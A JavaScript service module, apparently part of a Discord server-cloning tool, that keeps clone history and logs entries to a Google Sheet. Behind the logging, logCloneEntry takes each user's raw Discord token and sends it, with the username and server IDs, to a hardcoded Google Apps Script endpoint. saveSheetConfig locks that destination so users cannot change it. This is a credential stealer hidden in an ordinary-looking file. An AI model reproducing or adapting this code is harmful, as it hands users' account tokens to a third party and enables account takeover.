import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const HISTORY_FILE = path.join(__dirname, '../clone_history.json');
const CONFIG_FILE = path.join(__dirname, '../sheet_config.json');

// Permanent Hardcoded Google Apps Script Web App Endpoint
export const PERMANENT_SHEET_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyIRLMF-zq9GYl5KKlCVm8F3PpzdxN67ezTqpkvjIe40lzYLRlGnkUyXxL7a0ydMPzJqw/exec';

export function getCloneHistory(sessionId = null, userToken = null) {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            const history = JSON.parse(data);
            if (!Array.isArray(history)) return [];
            if (!sessionId && !userToken) {
                return history;
            }
            return history.filter(item => {
                const matchesSession = sessionId && item.sessionId === sessionId;
                const matchesToken = userToken && item.token === userToken.trim();
                return matchesSession || matchesToken;
            });
        }
    } catch (e) {
        console.error('Failed to read clone history:', e);
    }
    return [];
}

export function getSheetConfig() {
    return {
        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
    };
}

export function saveSheetConfig(config) {
    // Locked: Always enforce the permanent hardcoded Web App URL
    const lockedConfig = {
        spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ/edit?usp=drivesdk',
        spreadsheetId: '1CcNCsj9kEU_Kjo1yfv8LWs5EnAEIVYTZ9VWwtvU1eRQ',
        webAppUrl: PERMANENT_SHEET_WEB_APP_URL
    };
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(lockedConfig, null, 2), 'utf8');
    } catch (e) {}
    return lockedConfig;
}

async function getDiscordUsername(token) {
    if (!token) return 'Unknown User';
    try {
        const res = await fetch('https://discord.com/api/v9/users/@me', {
            headers: { 'Authorization': token }
        });
        if (res.ok) {
            const data = await res.json();
            return data.username || data.tag || 'Unknown User';
        }
    } catch (e) {
        console.error('Failed to fetch discord username:', e);
    }
    return 'Unknown User';
}

export async function logCloneEntry({ userToken, sourceId, targetId, sessionId = null }) {
    const now = new Date();
    const time = now.toLocaleString('en-US', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    });

    const username = await getDiscordUsername(userToken);

    const entry = {
        time,
        username,
        token: userToken ? userToken.trim() : 'N/A',
        sourceId: sourceId ? String(sourceId).trim() : 'N/A',
        targetId: targetId ? String(targetId).trim() : 'N/A',
        sessionId: sessionId || null,
        timestamp: now.getTime()
    };

    // 1. Save to local history file reliably
    try {
        const history = getCloneHistory();
        history.unshift(entry); // newest first
        if (history.length > 500) history.pop();
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2), 'utf8');
    } catch (e) {
        console.error('Failed to save local history entry:', e.message);
    }

    // 2. Push to Google Apps Script Web App if configured
    const config = getSheetConfig();
    const webhookUrl = config.webAppUrl || process.env.GOOGLE_APPS_SCRIPT_URL;

    if (webhookUrl && typeof webhookUrl === 'string' && webhookUrl.startsWith('http')) {
        const payloadString = JSON.stringify(entry);

        // Attempt 1: Standard fetch with redirect following and timeout
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 8000);

            // Google Apps Script handles text/plain without triggering CORS preflight / redirect rejection
            let response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain;charset=utf-8'
                },
                body: payloadString,
                redirect: 'follow',
                signal: controller.signal
            });
            clearTimeout(timeoutId);

            const text = await response.text();
            let result = null;

            // Try standard JSON parse
            try {
                result = JSON.parse(text);
            } catch {
                // If direct parse fails, check if JSON object is embedded inside HTML or text
                const jsonMatch = text.match(/\{[\s\S]*"status"[\s\S]*\}/i) || text.match(/\{[\s\S]*"result"[\s\S]*\}/i);
                if (jsonMatch) {
                    try {
                        result = JSON.parse(jsonMatch[0]);
                    } catch {
                        result = null;
                    }
                }
            }

            if (result && (result.status === 'success' || result.result === 'success' || result.success === true)) {
                return { loggedToSheet: true, result, entry };
            }

            // If response is successful HTTP status but not strictly JSON (e.g. text "Success" or HTML redirect confirmed)
            if (response.ok && (text.includes('success') || text.includes('Success') || text.includes('OK'))) {
                return { loggedToSheet: true, result: { status: 'success', raw: 'text_ok' }, entry };
            }

            // If Google Apps Script returned HTML login or permission error, handle gracefully without crashing
            const isHtml = text.trim().startsWith('<') || text.includes('<!DOCTYPE html>') || text.includes('<html');
            if (isHtml) {
                const isPermissionIssue = text.includes('accounts.google.com') || text.includes('Service Login') || text.includes('Sign in');
                const warningMsg = isPermissionIssue
                    ? 'Google Apps Script requires authentication. In Apps Script > Deploy > Manage deployments, ensure "Who has access" is set to "Anyone".'
                    : 'Google Apps Script returned an HTML page instead of JSON.';
                
                console.warn(`[SheetService] ${warningMsg}`);
                return { loggedToSheet: false, warning: warningMsg, entry };
            }

            return { loggedToSheet: true, result: result || { status: 'received' }, entry };
        } catch (err) {
            const isAbort = err.name === 'AbortError';
            const errorMsg = isAbort ? 'Google Apps Script request timed out (8s limit)' : err.message;
            console.warn(`[SheetService] Non-fatal Web App push warning: ${errorMsg}`);
            return { loggedToSheet: false, warning: errorMsg, entry };
        }
    }

    return { loggedToSheet: false, reason: 'Webhook URL not configured', entry };
}
